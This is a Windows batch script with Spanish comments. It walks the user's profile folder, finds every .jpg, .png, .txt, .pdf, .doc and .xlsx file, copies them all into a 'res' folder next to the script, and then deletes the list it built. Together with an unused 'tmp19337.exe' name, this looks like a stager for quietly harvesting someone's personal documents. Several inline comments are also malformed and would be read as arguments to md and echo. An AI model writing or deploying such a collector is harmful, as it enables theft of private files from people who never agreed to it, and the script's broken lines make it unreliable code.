@echo off
setlocal enabledelayedexpansion

rem Configuración de variables
set "tempDir=%TEMP%\ztmp"          Rem Directorio temporal para archivos temporales
set "filesDir=%TEMP%\afolder"      Rem Directorio temporal para archivos adicionales
set "exeFile=tmp19337.exe"         Rem Nombre del archivo ejecutable (no utilizado en el script actual)
set "scriptDir=%~dp0"              Rem Directorio del script actual
set "resDir=%scriptDir%res"        Rem Directorio de destino para la copia de archivos

rem Creación de directorios
md "!resDir!"                       Rem Crear el directorio de destino

rem Extensiones de archivos a buscar
set "fileExtensions=.jpg .png .txt .pdf .doc .xlsx"

rem Listado de archivos y escritura en un archivo de texto
set "fileList=%HOMEDRIVE%\pic.txt" Rem Ruta completa al archivo que contendrá la lista de archivos encontrados
type nul > "!fileList!"            Rem Crear un archivo vacío o sobrescribir si ya existe
for %%i in (%fileExtensions%) do (
    for /r "%USERPROFILE%" %%f in (*%%i) do (
        echo Encontrado: %%f
        echo %%f >> "!fileList!"  Rem Agregar la ruta del archivo encontrado a la lista
    )
)

rem Copia de archivos al directorio "res"
echo Copiando archivos a: "!resDir!"
for /f "delims=" %%n in (!fileList!) do (
    echo Copiando: %%n a: "!resDir!"
    copy "%%n" "!resDir!"           Rem Copiar cada archivo encontrado al directorio de destino
)

rem Limpieza (comentado para evitar eliminar los archivos copiados accidentalmente)
rem echo Eliminando archivos de: "!resDir!"
rem for %%f in (!resDir!\*) do (
rem     echo Eliminando: %%f
rem     del "%%f"                    Rem Eliminar archivos del directorio de destino
rem )

rem Eliminar el archivo de lista
del "!fileList!"                     Rem Eliminar el archivo que contiene la lista de archivos encontrados

endlocal
exit /b
